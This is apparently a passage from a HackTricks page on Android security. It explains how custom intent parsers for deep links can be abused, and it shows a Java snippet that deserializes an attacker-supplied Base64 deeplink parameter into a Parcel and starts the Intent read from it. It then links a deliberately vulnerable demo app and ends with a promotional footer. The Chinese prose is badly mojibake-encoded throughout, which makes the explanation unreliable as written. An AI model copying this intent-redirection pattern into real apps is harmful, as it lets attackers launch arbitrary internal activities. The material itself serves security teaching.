ä¸€äº›åº”ç”¨ç¨‹åºå¼€å‘äººå‘˜å®ç°äº†è‡ªå·±çš„æ„å›¾è§£æå™¨ï¼ˆé€šå¸¸ç”¨äºå¤„ç†æ·±é“¾æ¥æˆ–æ¨é€æ¶ˆæ¯ï¼‰ï¼Œä½¿ç”¨JSONå¯¹è±¡ã€å­—ç¬¦ä¸²æˆ–å­—èŠ‚æ•°ç»„ç­‰ï¼Œè¿™äº›æ–¹æ³•ä¸é»˜è®¤æ–¹æ³•æ²¡æœ‰åŒºåˆ«ï¼Œæˆ–è€…å­˜åœ¨å¾ˆå¤§çš„å±é™©ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½ä¼šæ‰©å±•`Serializable`å’Œ`Parcelable`å¯¹è±¡ï¼Œå¹¶ä¸”å®ƒä»¬è¿˜å…è®¸è®¾ç½®ä¸å®‰å…¨çš„æ ‡å¿—ã€‚å®‰å…¨ç ”ç©¶äººå‘˜è¿˜å¯èƒ½é‡åˆ°æ›´å¥‡ç‰¹çš„æ„å›¾åˆ›å»ºç‰ˆæœ¬ï¼Œä¾‹å¦‚å°†å­—èŠ‚æ•°ç»„è½¬æ¢ä¸º`Parcel`ï¼Œç„¶åä»ä¸­è¯»å–æ„å›¾ã€‚
```java
Uri deeplinkUri = getIntent().getData();
if(deeplinkUri.toString().startsWith("deeplink://handle/")) {
byte[] handle = Base64.decode(deeplinkUri.getQueryParameter("param"), 0);
Parcel parcel = Parcel.obtain();
parcel.unmarshall(handle, 0, handle.length);
startActivity((Intent) parcel.readParcelable(getClassLoader()));
}
```
# Vuln app

{% embed url="https://github.com/oversecured/ovaa" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
